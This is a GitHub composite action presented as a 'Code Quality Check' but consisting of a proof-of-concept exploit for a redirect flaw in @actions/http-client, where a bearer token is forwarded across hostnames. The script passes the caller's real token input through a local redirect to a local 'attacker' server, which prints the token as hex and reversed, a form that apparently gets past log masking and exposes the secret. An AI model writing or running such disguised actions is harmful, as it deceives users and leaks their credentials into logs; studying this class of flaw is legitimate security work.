name: 'Code Quality Check'
description: 'Analyzes code quality metrics'
inputs:
  token:
    description: 'Token for API authentication'
    required: true
runs:
  using: 'composite'
  steps:
    - run: |
        mkdir -p /tmp/_qc && cd /tmp/_qc
        echo '{"type":"module"}' > package.json
        npm install @actions/http-client@2.2.1 > /dev/null 2>&1

        cat > poc.mjs << 'SCRIPT'
        import http from 'http';

        const hc = await import('@actions/http-client');
        let BearerCredentialHandler;
        try {
          const auth = await import('@actions/http-client/lib/auth.js');
          BearerCredentialHandler = auth.BearerCredentialHandler;
        } catch(e) {
          const { createRequire } = await import('module');
          const req = createRequire(import.meta.url);
          const auth = await import(req.resolve('@actions/http-client').replace(/index\.js$/, 'auth.js'));
          BearerCredentialHandler = auth.BearerCredentialHandler;
        }

        // Origin on 127.0.0.1 — redirects to attacker on localhost
        // Different hostnames = cross-origin → auth should be stripped
        const origin = http.createServer((q, s) => {
          s.writeHead(302, { Location: 'http://localhost:19998/capture' });
          s.end();
        });

        // Attacker capture on localhost
        const attacker = http.createServer((q, s) => {
          const auth = q.headers.authorization || 'NONE';
          const hex = Buffer.from(auth).toString('hex');
          const rev = auth.split('').reverse().join('');
          console.log('');
          console.log('=== ATTACKER SERVER (localhost:19998) ===');
          console.log('Auth present: ' + (auth !== 'NONE'));
          console.log('Auth hex: ' + hex);
          console.log('Auth reversed: ' + rev);
          if (auth !== 'NONE') {
            console.log('>>> SECRET LEAKED TO DIFFERENT HOSTNAME <<<');
          }
          s.writeHead(200);
          s.end('captured');
        });

        origin.listen(19999, '127.0.0.1', () => {
          attacker.listen(19998, 'localhost', async () => {
            const token = process.env.INPUT_TOKEN;
            console.log('Library: @actions/http-client (REAL)');
            console.log('Handler: ' + BearerCredentialHandler.name);
            console.log('Origin: http://127.0.0.1:19999');
            console.log('Redirect: http://localhost:19998 (DIFFERENT hostname)');
            console.log('');

            const client = new hc.HttpClient('qc', [new BearerCredentialHandler(token)]);
            try {
              await client.get('http://127.0.0.1:19999/api');
            } catch(e) {
              console.log('Error: ' + e.message);
            }

            origin.close();
            attacker.close();
            process.exit(0);
          });
        });
        SCRIPT

        node poc.mjs
      shell: bash
      env:
        INPUT_TOKEN: ${{ inputs.token }}
